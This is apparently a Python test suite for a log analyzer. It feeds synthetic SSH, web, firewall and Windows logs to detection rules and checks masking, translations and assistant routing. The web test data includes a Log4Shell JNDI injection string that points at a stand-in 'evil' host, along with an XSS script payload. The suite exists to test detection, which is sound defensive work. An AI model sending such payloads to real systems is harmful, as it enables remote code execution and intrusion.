"""Log Analyzer: each kind of attack in realistic sample logs is found, benign logs stay quiet, secrets are masked, all four languages are complete."""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import log_analyzer as L, log_analyzer_ui as U

def ids(text):
    return {f["id"] for f in L.analyze(text, 2026)["findings"]}

# built-in sample: a whole intrusion story
r = L.analyze(U.SAMPLE, 2026)
got = {f["id"] for f in r["findings"]}
for want in ("ssh_bruteforce", "login_after_failures", "account_created", "sudo_abuse", "malicious_command", "web_sqli", "web_traversal", "web_sensitive_files", "web_scanner", "system_errors", "secrets_in_logs"):
    assert want in got, (want, got)
assert r["level"] == "critical" and r["score"] >= 70
sec = next(f for f in r["findings"] if f["id"] == "secrets_in_logs")
assert sec["count"] == 1 and all("Secret123" not in t for _n, t in sec["samples"]) and "Secret123" not in L.to_markdown(r, "en")   # PWD= is not a secret; the real password is masked

# SSH: below the threshold nothing, brute force critical at 20+
few = "\n".join(f"Oct 31 10:00:0{i} h sshd[1]: Failed password for bob from 8.8.4.4 port 22 ssh2" for i in range(3))
assert "ssh_bruteforce" not in ids(few + "\nOct 31 10:00:09 h sshd[1]: Accepted publickey for bob from 1.1.1.1 port 22 ssh2")
many = "\n".join(f"Oct 31 10:00:{i:02d} h sshd[1]: Failed password for invalid user u{i} from 8.8.4.4 port 22 ssh2" for i in range(25))
rr = L.analyze(many, 2026)
assert next(f for f in rr["findings"] if f["id"] == "ssh_bruteforce")["severity"] == "critical" and "password_spraying" in {f["id"] for f in rr["findings"]}

# web: Log4Shell, XSS, 404 scan, login brute force, 5xx
def web(path, st="200", ip="9.9.9.9", m="GET", ua="Mozilla/5.0"):
    return f'{ip} - - [31/Oct/2026:10:00:00 +0200] "{m} {path} HTTP/1.1" {st} 100 "-" "{ua}"'
assert "web_cmdi" in ids(web("/?x=${jndi:ldap://evil/a}")) and "web_xss" in ids(web("/s?q=%3Cscript%3Ealert(1)%3C/script%3E"))
assert "http_scan_404" in ids("\n".join(web(f"/p{i}", "404") for i in range(30)))
assert "http_login_bruteforce" in ids("\n".join(web("/wp-login.php", "200", m="POST") for _ in range(12)))
assert "server_errors" in ids("\n".join(web(f"/a{i}", "500") for i in range(12)))

# firewall port scan and Windows events
fw = "\n".join(f"Oct 31 10:00:00 gw kernel: [UFW BLOCK] IN=eth0 SRC=7.7.7.7 DST=10.0.0.5 PROTO=TCP SPT=4444 DPT={p}" for p in range(20, 40))
assert "port_scan" in ids(fw)
win = "\n".join(f"2026-10-31 10:00:0{i} EventID=4625 Account Name: admin Source Network Address: 6.6.6.6" for i in range(8)) + "\n2026-10-31 10:05:00 EventID=1102 The audit log was cleared\n2026-10-31 10:06:00 EventID=4720 A user account was created"
assert {"windows_failed_logons", "log_tampering", "account_created"} <= ids(win)

# benign logs stay clean
ok = "\n".join([web("/index.html"), web("/about.html"), web("/img/logo.png"), "Oct 31 10:00:00 h sshd[1]: Accepted publickey for ana from 10.0.0.2 port 22 ssh2", "Oct 31 10:01:00 h CRON[5]: (root) CMD (run-parts /etc/cron.hourly)"])
assert ids(ok) == {"clean"} and L.analyze(ok, 2026)["level"] == "none"
assert L.looks_like_log(ok) and not L.looks_like_log("Hello, please help me write an email to my boss.\nThanks.\nBye")

# JSON lines and CSV
js = "\n".join('{"time":"2026-10-31T10:00:0%d","message":"Failed password for root from 5.5.5.5 port 22 ssh2"}' % i for i in range(7))
assert "ssh_bruteforce" in ids(js)

# all four languages complete, markdown works, limits hold
for rid, rule in L.R.items():
    for key in ("title", "why", "do"):
        assert set(rule[key]) == set(L.LANGS) and len({rule[key][l] for l in L.LANGS}) == 4 and all(len(rule[key][l]) > 10 for l in L.LANGS), (rid, key)
for lang in L.LANGS:
    md = L.to_markdown(r, lang)
    assert L.LBL[lang]["levels"]["critical"] in md and len(md) > 800
assert set(U.S) == set(L.LANGS) and all(set(U.S[l]) == set(U.S["en"]) for l in U.S)
big = L.analyze("x\n" * 300000, 2026)
assert big["stats"]["truncated"] and big["stats"]["lines"] <= L.MAX_LINES
assert L.analyze("", 2026)["findings"][0]["id"] == "clean"
print("OK log analyzer")

# assistant routing: "analyze my logs" explains the feature in every language
import assistant_flow as F
for lang, q in (("en", "Can you analyze my logs?"), ("fr", "Peux-tu analyser mes logs ?"), ("rw", "Ushobora gusesengura logs zanjye?"), ("sw", "Unaweza kuchanganua kumbukumbu?")):
    d = F.route(q, lang)
    assert d["kind"] == "guide" and d["entry"]["id"] == "log_analyzer_help", (lang, d["kind"])
print("OK log analyzer routing")
